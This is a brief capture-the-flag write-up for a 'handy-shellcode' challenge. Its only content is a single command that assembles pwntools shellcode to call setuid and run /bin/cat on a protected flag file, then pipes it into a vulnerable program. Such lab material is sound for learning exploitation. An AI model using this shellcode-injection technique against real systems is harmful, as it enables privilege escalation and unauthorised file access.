# handy-shellcode 

## Solution

```sh
cd /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405; python -c 'from pwn import *; print(asm(shellcraft.setuid(1002) + shellcraft.execve(path="/bin/cat", argv=["/bin/cat","./flag.txt"])))' | ./vuln;echo
```
